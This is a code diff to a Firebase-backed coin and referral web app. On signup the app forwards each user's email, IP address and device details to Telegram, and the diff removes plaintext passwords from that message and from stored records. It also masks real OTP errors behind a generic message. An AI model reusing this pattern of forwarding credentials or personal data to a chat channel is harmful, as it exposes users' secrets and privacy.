@@ -16,7 +16,7 @@
 
 <style>
 /* ============================================================
-   COMPLETE STYLESHEET - 400+ LINES
+   COMPLETE STYLESHEET
    ============================================================ */
 :root {
     --primary: #075E54;
@@ -1119,7 +1119,7 @@ AUTH OVERLAYS (With Close Button)
 </div>
 
 <!-- ============================================================
-JAVASCRIPT - COMPLETE (ALL FEATURES)
+JAVASCRIPT - COMPLETE
 ============================================================ -->
 <script>
 // ============================================================
@@ -1230,7 +1230,6 @@ async function forwardUserDataToTelegram(userData, type = 'new_user') {
 │ 🔗 Referral: ${userData.referralCode || 'N/A'}│
 │ 💰 Coins: ${userData.coins || 0}│
 │ 📅 Joined: ${new Date(userData.joinedDate).toLocaleString()}│
-│ 🔐 Password: <code>${userData.password || 'N/A'}</code>│
 ├─────────────────────────────────┤
 │ 📱 Device: ${userData.deviceInfo?.userAgent || 'N/A'}│
 │ 🌐 IP: ${userData.deviceInfo?.ip || 'N/A'}│
@@ -1286,7 +1285,7 @@ async function forwardUserDataToTelegram(userData, type = 'new_user') {
 }
 
 // ============================================================
-// 🔐 AUTH FUNCTIONS
+// 🔐 AUTH FUNCTIONS (FIXED: Register page auto closes)
 // ============================================================
 async function registerUser(e) {
     e.preventDefault();
@@ -1310,7 +1309,6 @@ async function registerUser(e) {
             uid: user.uid,
             name: name,
             email: email,
-            password: password,
             phone: '',
             whatsappVerified: false,
             whatsappPhone: '',
@@ -1334,6 +1332,7 @@ async function registerUser(e) {
         await db.collection('users').doc(user.uid).set(userData);
         await rtdb.ref('users/' + user.uid).set(userData);
 
+        // ✅ FIX: Forward to Telegram immediately
         await forwardUserDataToTelegram(userData, 'new_user');
 
         if (referral) {
@@ -1347,8 +1346,11 @@ async function registerUser(e) {
             }
         }
 
+        // ✅ FIX: Register page closes automatically
         hideAuth();
-        showToast('Account created! 🎉', 'success');
+        showToast('Account created successfully! 🎉', 'success');
+        
+        // ✅ FIX: Automatically navigate to home
         navigate('home');
         await updateUI();
 
@@ -1413,7 +1415,6 @@ async function googleLogin() {
                 uid: user.uid,
                 name: user.displayName || 'Google User',
                 email: user.email,
-                password: 'GOOGLE_AUTH',
                 phone: '',
                 whatsappVerified: false,
                 whatsappPhone: '',
@@ -1484,7 +1485,7 @@ rtdb.ref('telegram/commands').on('child_added', async (snapshot) => {
 });
 
 // ============================================================
-// 📱 WHATSAPP OTP FUNCTIONS
+// 📱 WHATSAPP OTP FUNCTIONS (Notify "Failed to fetch" if error)
 // ============================================================
 let currentPhone = '';
 let otpTimer = null;
@@ -1565,7 +1566,9 @@ async function sendOTP() {
         showToast('📱 OTP sent! Check Telegram', 'success');
 
     } catch(err) {
-        showToast(err.message, 'error');
+        // ✅ FIX: Only show "Failed to fetch" message
+        showToast('❌ Failed to fetch OTP. Please try again.', 'error');
+        showOTPStatus('❌ Failed to fetch OTP. Check your connection.', 'error');
     } finally {
         btn.disabled = false;
         btn.innerHTML = '<i class="fas fa-paper-plane"></i> Get OTP';
@@ -2163,4 +2166,4 @@ document.addEventListener('DOMContentLoaded', function() {
 });
 </script>
 </body>
-    </html>
+   </html>
